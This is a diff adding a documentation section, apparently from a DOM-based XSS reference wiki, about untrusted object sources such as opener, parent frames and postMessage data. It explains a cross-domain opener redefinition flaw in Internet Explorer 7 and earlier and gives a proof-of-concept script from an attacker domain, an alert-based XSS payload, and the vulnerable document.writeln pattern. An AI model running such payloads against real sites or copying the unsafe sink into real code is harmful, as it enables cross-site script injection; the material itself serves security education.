@@ -1,0 +1,40 @@
+### Other Objects Sources ###
+
+(TBA)
+
+  * opener (IE <= 7 Only)
+  * parent/top/frames`[`i`]`.obj
+  * event.data of onmessage event for postMessage method
+
+
+#### Opener ####
+
+In 2008 in [[[3](#References.md)]] it was presented a study about Browser Based DOM Xss, describing how browsers behave when objects belonging to different windows and domains are overwritten or deleted from evil pages.
+
+It was found that IE <= 7 allows cross windows/cross domain opener redefinition, causing the re-instantiation of the object in the other window thus breaking the SOP in access control.
+
+```
+// From attacker.tld
+window.aFrame.location="http://victim/PageUsingOpenerObject.html"
+window.aFrame.opener={someAttr:"someValue", someAttr2: function(){return someReturnValue}}
+```
+
+So if a page from victim host uses:
+```
+<script>
+document.writeln("<p>" + window.opener.Message + "</p>");
+</script>
+```
+
+An attacker can use from `<iframe name=aFrame></iframe>`
+```
+// From attacker.tld
+window.aFrame.location="http://victim/PageUsingOpenerObject.html"
+window.aFrame.opener={Message:"<sc"+"ript>alert(document.domain)</scr"+"ipt>"}
+```
+
+The code above works perfectly on IE7 and the fake Message is taken by victim host, without any error message.
+
+Opener object can, hence, be considered as a source of untrusted input in the unfortunate case the victim uses IE 7.
+
+N.B. IE 8 fixes this issue.
